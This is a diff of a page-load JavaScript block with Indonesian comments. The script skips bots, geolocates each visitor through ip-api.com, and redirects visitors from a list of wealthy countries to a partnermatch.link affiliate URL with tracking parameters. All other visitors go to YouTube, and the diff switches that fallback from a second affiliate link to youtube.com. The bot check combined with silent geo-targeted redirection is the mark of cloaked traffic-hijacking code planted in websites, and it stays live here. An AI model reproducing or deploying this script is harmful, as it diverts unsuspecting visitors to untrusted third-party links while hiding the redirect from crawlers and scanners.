@@ -1,4 +1,5 @@
- <script>
+
+    <script>
         document.addEventListener('DOMContentLoaded', function() {
             function isBot() {
                 var botPatterns = [
@@ -21,13 +22,14 @@
                     return;
                 }
 
-                fetch('http://ip-api.com/json/')
+                fetch('https://ip-api.com/json/')
                     .then(response => response.json())
                     .then(data => {
                         var country = data.countryCode;
 
+                        // Definisikan URL berdasarkan negara
                         var targetUrl = "https://cdefecf.partnermatch.link/s/22edadef06445?track=LEGIT&subsource=TEVHSVQsQ1osMTg1LjI0Mi42LjUyLFdBUCxUUkFGRUU";
-                        var youtubeUrl = "https://cdefecf.partnermatch.link/s/22edadef06445?track=JOKOSEMUJUNG&subsource=Sk9LT1NFTVVKVU5HLEVTLDE4NS4xODguNjEuNDUsV0VCLFRSQUZFRQ";
+                        var youtubeUrl = "https://www.youtube.com";
 
                         // Daftar negara yang perlu diarahkan ke targetUrl
                         var redirectCountries = [
@@ -35,6 +37,7 @@
                             "JP", "NL", "NZ", "NO", "PT", "ES", "SE", "CH", "GB", "US"
                         ];
 
+                        // Redirect pengguna berdasarkan negara
                         if (redirectCountries.includes(country)) {
                             window.location.href = targetUrl;
                         } else {
@@ -43,10 +46,11 @@
                     })
                     .catch(error => {
                         console.error('Error fetching geolocation data:', error);
-                        window.location.href = "https://cdefecf.partnermatch.link/s/22edadef06445?track=JOKOSEMUJUNG&subsource=Sk9LT1NFTVVKVU5HLEVTLDE4NS4xODguNjEuNDUsV0VCLFRSQUZFRQ";
+                        window.location.href = "https://www.youtube.com";
                     });
             }
 
             redirectToSmartURL();
         });
     </script>
+
